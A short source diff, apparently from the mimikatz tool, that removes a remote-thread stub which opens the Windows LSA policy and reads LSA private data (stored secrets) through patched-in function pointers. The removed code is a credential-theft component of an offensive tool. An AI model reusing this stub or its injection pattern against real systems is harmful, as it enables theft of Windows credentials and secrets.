@@ -88,28 +88,4 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 	return STATUS_SUCCESS;
 }
 DWORD kuhl_sekurlsa_samsrv_thread_end(){return 'lsar';}
-#ifdef LSARPDATA
-DWORD WINAPI kuhl_lsadump_RetrievePrivateData_thread(PREMOTE_LIB_DATA lpParameter)
-{
-	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
-	LSA_HANDLE hPolicy;
-	LSA_UNICODE_STRING uInputString = {(USHORT) lpParameter->input.inputSize, (USHORT) lpParameter->input.inputSize, (PWSTR) lpParameter->input.inputData}, *uOutString;
-
-
-	if(NT_SUCCESS(((PLSAOPENPOLICY) 0x4141414141414141)(NULL, &oaLsa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy)))
-	{
-		lpParameter->output.outputStatus = ((PLSARETRIEVEPRIVATEDATA) 0x4444444444444444)(hPolicy, &uInputString, &uOutString);
-		if(NT_SUCCESS(lpParameter->output.outputStatus))
-		{
-			lpParameter->output.outputSize = uOutString->Length;
-			if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
-				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(lpParameter->output.outputData, uOutString->Buffer, lpParameter->output.outputSize);
-			((PLSAFREEMEMORY) 0x4343434343434343)(uOutString);
-		}
-		((PLSACLOSE) 0x4242424242424242)(hPolicy);
-	}
-	return STATUS_SUCCESS;
-}
-DWORD kuhl_lsadump_RetrievePrivateData_thread_end(){return 'lsap';}
-#endif
 #pragma optimize("", on)
